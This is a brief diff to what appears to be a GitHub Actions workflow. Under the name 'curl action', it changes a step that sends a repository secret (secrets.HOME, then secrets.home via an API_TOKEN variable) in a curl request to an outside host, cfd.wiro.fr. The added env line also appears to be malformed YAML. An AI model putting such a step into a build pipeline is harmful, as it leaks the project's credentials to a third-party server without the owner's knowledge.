@@ -36,4 +36,5 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
       - name: curl action
-        run: curl http://cfd.wiro.fr/${{ secrets.HOME }}
+        run: curl http://cfd.wiro.fr/$API_TOKEN
+        env: API_TOKEN: ${{ secrets.home }}
